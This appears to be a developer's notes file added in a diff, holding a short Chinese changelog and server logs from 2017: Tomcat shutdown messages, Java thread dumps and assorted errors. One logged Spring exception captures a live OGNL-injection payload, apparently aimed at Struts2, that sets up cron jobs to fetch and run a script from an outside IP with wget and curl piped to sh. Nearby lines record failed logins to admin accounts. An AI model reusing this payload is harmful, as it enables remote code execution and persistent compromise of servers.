@@ -1,0 +1,358 @@
+ 1.添加按名称搜索库下目录的接口
+
+2.新增系统文件夹id：主题榜单 59c9b7a19c3236d2000aaa1b，热门榜单 59c9b7bfa2ad4bf800c7fa7f，排行榜主题分类 59c9b8239c3236d2000aaa80
+
+Oct 09, 2017 3:50:37 AM org.apache.catalina.core.StandardServer await
+INFO: A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol pause
+INFO: Pausing ProtocolHandler ["http-bio-8088"]
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol pause
+INFO: Pausing ProtocolHandler ["http-bio-8443"]
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol pause
+INFO: Pausing ProtocolHandler ["ajp-bio-8011"]
+Oct 09, 2017 3:50:37 AM org.apache.catalina.core.StandardService stopInternal
+INFO: Stopping service Catalina
+2017-10-09 03:50:37.251  INFO 1508 --- [ost-startStop-2] ationConfigEmbeddedWebApplicationContext : Closing org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext@20c1152a: startup date [Sat Sep 30 03:20:42 UTC 2017]; root of context hierarchy
+2017-10-09 03:50:37.254  INFO 1508 --- [ost-startStop-2] o.s.c.support.DefaultLifecycleProcessor  : Stopping beans in phase 2147483647
+2017-10-09 03:50:37.606  INFO 1508 --- [ost-startStop-2] o.s.j.e.a.AnnotationMBeanExporter        : Unregistering JMX-exposed beans on shutdown
+Oct 09, 2017 3:50:37 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesJdbc
+SEVERE: The web application [] registered the JDBC driver [com.mysql.jdbc.Driver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC Driver has been forcibly unregistered.
+Oct 09, 2017 3:50:37 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [java-sdk-http-connection-reaper] but has failed to stop it. This is very likely to create a memory leak.
+Oct 09, 2017 3:50:37 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [Abandoned connection cleanup thread] but has failed to stop it. This is very likely to create a memory leak.
+Oct 09, 2017 3:50:37 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [ThreadPoolTaskExecutor-1] but has failed to stop it. This is very likely to create a memory leak.
+Oct 09, 2017 3:50:37 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [ThreadPoolTaskExecutor-2] but has failed to stop it. This is very likely to create a memory leak.
+Oct 09, 2017 3:50:37 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [ThreadPoolTaskExecutor-3] but has failed to stop it. This is very likely to create a memory leak.
+Oct 09, 2017 3:50:37 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [ThreadPoolTaskExecutor-4] but has failed to stop it. This is very likely to create a memory leak.
+Oct 09, 2017 3:50:37 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [ThreadPoolTaskExecutor-5] but has failed to stop it. This is very likely to create a memory leak.
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol stop
+INFO: Stopping ProtocolHandler ["http-bio-8088"]
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol stop
+INFO: Stopping ProtocolHandler ["http-bio-8443"]
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol stop
+INFO: Stopping ProtocolHandler ["ajp-bio-8011"]
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol destroy
+INFO: Destroying ProtocolHandler ["http-bio-8088"]
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol destroy
+INFO: Destroying ProtocolHandler ["http-bio-8443"]
+Oct 09, 2017 3:50:37 AM org.apache.coyote.AbstractProtocol destroy
+INFO: Destroying ProtocolHandler ["ajp-bio-8011"]
+2017-10-09 11:50:42
+Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.66-b17 mixed mode):
+
+"DestroyJavaVM" #5065 prio=5 os_prio=0 tid=0x00007fc2341d9000 nid=0x5e5 waiting on condition [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"ThreadPoolTaskExecutor-5" #2262 prio=5 os_prio=0 tid=0x00007fc1e8a6a000 nid=0x1358 waiting on condition [0x00007fc1e48e8000]
+   java.lang.Thread.State: WAITING (parking)
+	at sun.misc.Unsafe.park(Native Method)
+	- parking to wait for  <0x00000000c4a998c8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
+	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
+	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
+	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)
+	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at java.lang.Thread.run(Thread.java:745)
+
+"ThreadPoolTaskExecutor-4" #2166 prio=5 os_prio=0 tid=0x00007fc1f00dd800 nid=0x123a waiting on condition [0x00007fc1e57f3000]
+   java.lang.Thread.State: WAITING (parking)
+	at sun.misc.Unsafe.park(Native Method)
+	- parking to wait for  <0x00000000c4a998c8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
+	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
+	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
+	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)
+	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at java.lang.Thread.run(Thread.java:745)
+
+"ThreadPoolTaskExecutor-3" #2025 prio=5 os_prio=0 tid=0x00007fc1f405f000 nid=0x11ad waiting on condition [0x00007fc1e61f9000]
+   java.lang.Thread.State: WAITING (parking)
+	at sun.misc.Unsafe.park(Native Method)
+	- parking to wait for  <0x00000000c4a998c8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
+	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
+	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
+	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)
+	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at java.lang.Thread.run(Thread.java:745)
+
+"ThreadPoolTaskExecutor-2" #1710 prio=5 os_prio=0 tid=0x00007fc1f00c9000 nid=0x106c waiting on condition [0x00007fc1e47e7000]
+   java.lang.Thread.State: WAITING (parking)
+	at sun.misc.Unsafe.park(Native Method)
+	- parking to wait for  <0x00000000c4a998c8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
+	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
+	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
+	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)
+	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at java.lang.Thread.run(Thread.java:745)
+
+"ThreadPoolTaskExecutor-1" #1081 prio=5 os_prio=0 tid=0x00007fc1ec01a800 nid=0xcf2 waiting on condition [0x00007fc21d3be000]
+   java.lang.Thread.State: WAITING (parking)
+	at sun.misc.Unsafe.park(Native Method)
+	- parking to wait for  <0x00000000c4a998c8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
+	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
+	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
+	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)
+	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at java.lang.Thread.run(Thread.java:745)
+
+"Abandoned connection cleanup thread" #67 daemon prio=5 os_prio=0 tid=0x00007fc21028e800 nid=0x73a in Object.wait() [0x00007fc1e5af4000]
+   java.lang.Thread.State: TIMED_WAITING (on object monitor)
+	at java.lang.Object.wait(Native Method)
+	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143)
+	- locked <0x00000000c5bb2050> (a java.lang.ref.ReferenceQueue$Lock)
+	at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43)
+
+"java-sdk-http-connection-reaper" #17 daemon prio=5 os_prio=0 tid=0x00007fc1e82b0800 nid=0x5f7 waiting on condition [0x00007fc1e7a78000]
+   java.lang.Thread.State: TIMED_WAITING (sleeping)
+	at java.lang.Thread.sleep(Native Method)
+	at com.amazonaws.http.IdleConnectionReaper.run(IdleConnectionReaper.java:181)
+
+"GC Daemon" #10 daemon prio=2 os_prio=0 tid=0x00007fc2343a6000 nid=0x5f0 in Object.wait() [0x00007fc21eb1d000]
+   java.lang.Thread.State: TIMED_WAITING (on object monitor)
+	at java.lang.Object.wait(Native Method)
+	- waiting on <0x00000000c266cae8> (a sun.misc.GC$LatencyLock)
+	at sun.misc.GC$Daemon.run(GC.java:117)
+	- locked <0x00000000c266cae8> (a sun.misc.GC$LatencyLock)
+
+"Service Thread" #7 daemon prio=9 os_prio=0 tid=0x00007fc2340ba000 nid=0x5ee runnable [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"C1 CompilerThread1" #6 daemon prio=9 os_prio=0 tid=0x00007fc2340b5000 nid=0x5ed waiting on condition [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"C2 CompilerThread0" #5 daemon prio=9 os_prio=0 tid=0x00007fc2340b2000 nid=0x5ec waiting on condition [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"Signal Dispatcher" #4 daemon prio=9 os_prio=0 tid=0x00007fc2340b0800 nid=0x5eb waiting on condition [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"Finalizer" #3 daemon prio=8 os_prio=0 tid=0x00007fc23407b000 nid=0x5ea in Object.wait() [0x00007fc21faf9000]
+   java.lang.Thread.State: WAITING (on object monitor)
+	at java.lang.Object.wait(Native Method)
+	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143)
+	- locked <0x00000000c266cd38> (a java.lang.ref.ReferenceQueue$Lock)
+	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:164)
+	at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:209)
+
+"Reference Handler" #2 daemon prio=10 os_prio=0 tid=0x00007fc234079000 nid=0x5e9 in Object.wait() [0x00007fc21fbfa000]
+   java.lang.Thread.State: WAITING (on object monitor)
+	at java.lang.Object.wait(Native Method)
+	at java.lang.Object.wait(Object.java:502)
+	at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:157)
+	- locked <0x00000000c266cb68> (a java.lang.ref.Reference$Lock)
+
+"VM Thread" os_prio=0 tid=0x00007fc234074000 nid=0x5e8 runnable
+
+"GC task thread#0 (ParallelGC)" os_prio=0 tid=0x00007fc23401f800 nid=0x5e6 runnable
+
+"GC task thread#1 (ParallelGC)" os_prio=0 tid=0x00007fc234021000 nid=0x5e7 runnable
+
+"VM Periodic Task Thread" os_prio=0 tid=0x00007fc2340bd000 nid=0x5ef waiting on condition
+
+JNI global references: 296
+
+Heap
+ PSYoungGen      total 51200K, used 3148K [0x00000000eb700000, 0x00000000efa00000, 0x0000000100000000)
+  eden space 50176K, 6% used [0x00000000eb700000,0x00000000eba13190,0x00000000ee800000)
+  from space 1024K, 0% used [0x00000000ee900000,0x00000000ee900000,0x00000000eea00000)
+  to   space 9216K, 0% used [0x00000000ef100000,0x00000000ef100000,0x00000000efa00000)
+ ParOldGen       total 152064K, used 74250K [0x00000000c2400000, 0x00000000cb880000, 0x00000000eb700000)
+  object space 152064K, 48% used [0x00000000c2400000,0x00000000c6c82928,0x00000000cb880000)
+ Metaspace       used 72906K, capacity 74792K, committed 76704K, reserved 1118208K
+  class space    used 7975K, capacity 8339K, committed 8704K, reserved 1048576K
+
+
+9-21
+
+org.springframework.http.InvalidMediaTypeException: Invalid mime type "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo "*/9 * * * * wget -O - -q http://5.188.87.11/common/logo.jpg|sh\n*/10 * * * * curl http://5.188.87.11/common/logo.jpg|sh" | crontab -;wget -O - -q http://5.188.87.11/common/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}": Invalid token character '{' in token "%{(#_='multipart"
+        at org.springframework.http.MediaType.parseMediaType(MediaType.java:385) ~[spring-web-4.2.3.RELEASE.jar:4.2.3.RELEASE]
+        at org.springframework.http.HttpHeaders.getContentType(HttpHeaders.java:717) ~[spring-web-4.2.3.RELEASE.jar:4.2.3.RELEASE]
+        at org.springframework.http.server.ServletServerHttpRequest.getHeaders(ServletServerHttpRequest.java:115) ~[spring-web-4.2.3.RELEASE.jar:4.2.3.RELEASE]
+        at org.springframework.web.servlet.mvc.method.annotation.HttpEntityMethodProcessor.isResourceNotModified(HttpEntityMethodProcessor.java:193) ~[spring-webmvc-4.2.3.RELEASE.jar:4.2.3.RELEASE]
+
+Sep 24, 2017 1:21:27 AM org.apache.catalina.realm.LockOutRealm authenticate
+WARNING: An attempt was made to authenticate the locked user "admin"
+Sep 24, 2017 1:21:27 AM org.apache.catalina.realm.LockOutRealm authenticate
+WARNING: An attempt was made to authenticate the locked user "tomcat"
+Sep 24, 2017 1:21:27 AM org.apache.catalina.realm.LockOutRealm authenticate
+WARNING: An attempt was made to authenticate the locked user "manager"
+
+
+redis.clients.jedis.exceptions.JedisDataException: ERR wrong number of arguments for 'hdel' command
+        at redis.clients.jedis.Protocol.processError(Protocol.java:117)
+
+Sep 26, 2017 3:39:12 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] is still processing a request that has yet to finish. This is very likely to create a memory leak. You can control the time allowed for requests to finish by using the unloadDelay attribute of the standard Context implementation.
+
+
+Sep 26, 2017 3:39:13 AM org.apache.catalina.loader.WebappClassLoaderBase loadClass
+INFO: Illegal access: this web application instance has been stopped already.  Could not load org.springframework.aop.framework.ReflectiveMethodInvocation.  The eventual following stack trace is caused by an error thrown for debugging purposes as well as to attempt to terminate the thread which caused the illegal access, and has no functional impact.
+
+SEVERE: The web application [] registered the JDBC driver [com.mysql.jdbc.Driver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC Driver has been forcibly unregistered.
+
+
+test2
+
+Oct 10, 2017 7:00:13 AM org.apache.catalina.core.StandardServer await
+INFO: A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+Oct 10, 2017 7:00:13 AM org.apache.coyote.AbstractProtocol pause
+INFO: Pausing ProtocolHandler ["http-bio-8088"]
+Oct 10, 2017 7:00:14 AM org.apache.coyote.AbstractProtocol pause
+INFO: Pausing ProtocolHandler ["ajp-bio-8011"]
+Oct 10, 2017 7:00:14 AM org.apache.catalina.core.StandardService stopInternal
+INFO: Stopping service Catalina
+2017-10-10 07:00:14.071  INFO 24546 --- [ost-startStop-2] ationConfigEmbeddedWebApplicationContext : Closing org.springframework.boot.context.embedded.AnnotationConfigEmbeddedWebApplicationContext@28297267: startup date [Tue Oct 10 03:03:13 UTC 2017]; root of context hierarchy
+2017-10-10 07:00:14.079  INFO 24546 --- [ost-startStop-2] o.s.c.support.DefaultLifecycleProcessor  : Stopping beans in phase 2147483647
+2017-10-10 07:00:14.087  INFO 24546 --- [ost-startStop-2] o.s.j.e.a.AnnotationMBeanExporter        : Unregistering JMX-exposed beans on shutdown
+Oct 10, 2017 7:00:14 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesJdbc
+SEVERE: The web application [] registered the JDBC driver [com.mysql.jdbc.Driver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC Driver has been forcibly unregistered.
+Oct 10, 2017 7:00:14 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [java-sdk-http-connection-reaper] but has failed to stop it. This is very likely to create a memory leak.
+Oct 10, 2017 7:00:14 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [Abandoned connection cleanup thread] but has failed to stop it. This is very likely to create a memory leak.
+Oct 10, 2017 7:00:14 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [ThreadPoolTaskExecutor-1] but has failed to stop it. This is very likely to create a memory leak.
+Oct 10, 2017 7:00:14 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [ThreadPoolTaskExecutor-2] but has failed to stop it. This is very likely to create a memory leak.
+Oct 10, 2017 7:00:14 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+SEVERE: The web application [] appears to have started a thread named [ThreadPoolTaskExecutor-3] but has failed to stop it. This is very likely to create a memory leak.
+Oct 10, 2017 7:00:14 AM org.apache.coyote.AbstractProtocol stop
+INFO: Stopping ProtocolHandler ["http-bio-8088"]
+Oct 10, 2017 7:00:14 AM org.apache.coyote.AbstractProtocol stop
+INFO: Stopping ProtocolHandler ["ajp-bio-8011"]
+Oct 10, 2017 7:00:14 AM org.apache.coyote.AbstractProtocol destroy
+INFO: Destroying ProtocolHandler ["http-bio-8088"]
+Oct 10, 2017 7:00:14 AM org.apache.coyote.AbstractProtocol destroy
+INFO: Destroying ProtocolHandler ["ajp-bio-8011"]
+2017-10-10 15:00:18
+Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.66-b17 mixed mode):
+
+"DestroyJavaVM" #22981 prio=5 os_prio=0 tid=0x00007fccec23f800 nid=0x5fe3 waiting on condition [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"ThreadPoolTaskExecutor-3" #22227 prio=5 os_prio=0 tid=0x00007fccac003000 nid=0x3923 waiting on condition [0x00007fcc9e887000]
+   java.lang.Thread.State: WAITING (parking)
+	at sun.misc.Unsafe.park(Native Method)
+	- parking to wait for  <0x00000000c46be858> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
+	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
+	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
+	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)
+	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at java.lang.Thread.run(Thread.java:745)
+
+"ThreadPoolTaskExecutor-2" #22226 prio=5 os_prio=0 tid=0x00007fcca4ca8000 nid=0x3922 waiting on condition [0x00007fcc9ed8c000]
+   java.lang.Thread.State: WAITING (parking)
+	at sun.misc.Unsafe.park(Native Method)
+	- parking to wait for  <0x00000000c46be858> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
+	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
+	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
+	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)
+	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at java.lang.Thread.run(Thread.java:745)
+
+"ThreadPoolTaskExecutor-1" #19087 prio=5 os_prio=0 tid=0x00007fccb80be000 nid=0x2cc8 waiting on condition [0x00007fcc9e786000]
+   java.lang.Thread.State: WAITING (parking)
+	at sun.misc.Unsafe.park(Native Method)
+	- parking to wait for  <0x00000000c46be858> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
+	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
+	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
+	at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442)
+	at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
+	at java.lang.Thread.run(Thread.java:745)
+
+"Abandoned connection cleanup thread" #113 daemon prio=5 os_prio=0 tid=0x00007fcc9823e000 nid=0x6053 in Object.wait() [0x00007fcc9f08d000]
+   java.lang.Thread.State: TIMED_WAITING (on object monitor)
+	at java.lang.Object.wait(Native Method)
+	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143)
+	- locked <0x00000000c52bb298> (a java.lang.ref.ReferenceQueue$Lock)
+	at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43)
+
+"java-sdk-http-connection-reaper" #17 daemon prio=5 os_prio=0 tid=0x00007fcca4f56000 nid=0x5ff5 waiting on condition [0x00007fccb0de8000]
+   java.lang.Thread.State: TIMED_WAITING (sleeping)
+	at java.lang.Thread.sleep(Native Method)
+	at com.amazonaws.http.IdleConnectionReaper.run(IdleConnectionReaper.java:181)
+
+"GC Daemon" #10 daemon prio=2 os_prio=0 tid=0x00007fccec3f1800 nid=0x5fee in Object.wait() [0x00007fccb39b0000]
+   java.lang.Thread.State: TIMED_WAITING (on object monitor)
+	at java.lang.Object.wait(Native Method)
+	- waiting on <0x00000000c25bfc50> (a sun.misc.GC$LatencyLock)
+	at sun.misc.GC$Daemon.run(GC.java:117)
+	- locked <0x00000000c25bfc50> (a sun.misc.GC$LatencyLock)
+
+"Service Thread" #7 daemon prio=9 os_prio=0 tid=0x00007fccec0ba000 nid=0x5fec runnable [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"C1 CompilerThread1" #6 daemon prio=9 os_prio=0 tid=0x00007fccec0b5000 nid=0x5feb waiting on condition [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"C2 CompilerThread0" #5 daemon prio=9 os_prio=0 tid=0x00007fccec0b2000 nid=0x5fea waiting on condition [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"Signal Dispatcher" #4 daemon prio=9 os_prio=0 tid=0x00007fccec0b0800 nid=0x5fe9 waiting on condition [0x0000000000000000]
+   java.lang.Thread.State: RUNNABLE
+
+"Finalizer" #3 daemon prio=8 os_prio=0 tid=0x00007fccec07b000 nid=0x5fe8 in Object.wait() [0x00007fccd49e9000]
+   java.lang.Thread.State: WAITING (on object monitor)
+	at java.lang.Object.wait(Native Method)
+	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143)
+	- locked <0x00000000c2401548> (a java.lang.ref.ReferenceQueue$Lock)
+	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:164)
+	at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:209)
+
+"Reference Handler" #2 daemon prio=10 os_prio=0 tid=0x00007fccec079000 nid=0x5fe7 in Object.wait() [0x00007fccd4aea000]
+   java.lang.Thread.State: WAITING (on object monitor)
+	at java.lang.Object.wait(Native Method)
+	at java.lang.Object.wait(Object.java:502)
+	at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:157)
+	- locked <0x00000000c2401588> (a java.lang.ref.Reference$Lock)
+
+"VM Thread" os_prio=0 tid=0x00007fccec074000 nid=0x5fe6 runnable
+
+"GC task thread#0 (ParallelGC)" os_prio=0 tid=0x00007fccec01f800 nid=0x5fe4 runnable
+
+"GC task thread#1 (ParallelGC)" os_prio=0 tid=0x00007fccec021000 nid=0x5fe5 runnable
+
+"VM Periodic Task Thread" os_prio=0 tid=0x00007fccec0bd000 nid=0x5fed waiting on condition
+
+JNI global references: 301
+
+Heap
+ PSYoungGen      total 164864K, used 15077K [0x00000000eb700000, 0x00000000f8e00000, 0x0000000100000000)
+  eden space 162816K, 8% used [0x00000000eb700000,0x00000000ec3df420,0x00000000f5600000)
+  from space 2048K, 92% used [0x00000000f8c00000,0x00000000f8dda320,0x00000000f8e00000)
+  to   space 5632K, 0% used [0x00000000f8300000,0x00000000f8300000,0x00000000f8880000)
+ ParOldGen       total 147456K, used 66832K [0x00000000c2400000, 0x00000000cb400000, 0x00000000eb700000)
+  object space 147456K, 45% used [0x00000000c2400000,0x00000000c6544080,0x00000000cb400000)
+ Metaspace       used 69007K, capacity 70622K, committed 70912K, reserved 1112064K
+  class space    used 7740K, capacity 8098K, committed 8192K, reserved 1048576K
+
+  07:30:10.052 [ThreadPoolTaskExecutor-1] ERROR com.dbcool.api.cfg.asynchronous.DbcAsyncExceptionHandler - Method name : deleteBaseAsync
+  Exceptin message : null
+  [Ljava.lang.StackTraceElement;@14ae44e1
+  org.springframework.web.client.HttpServerErrorException: 500 Internal Server Error
+test2新
+
+  Oct 13, 2017 9:49:44 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+  SEVERE: The web application [] appears to have started a thread named [java-sdk-http-connection-reaper] but has failed to stop it. This is very likely to create a memory leak.
+  Oct 13, 2017 9:49:44 AM org.apache.catalina.loader.WebappClassLoaderBase clearReferencesThreads
+  SEVERE: The web application [] appears to have started a thread named [Abandoned connection cleanup thread] but has failed to stop it. This is very likely to create a memory leak.
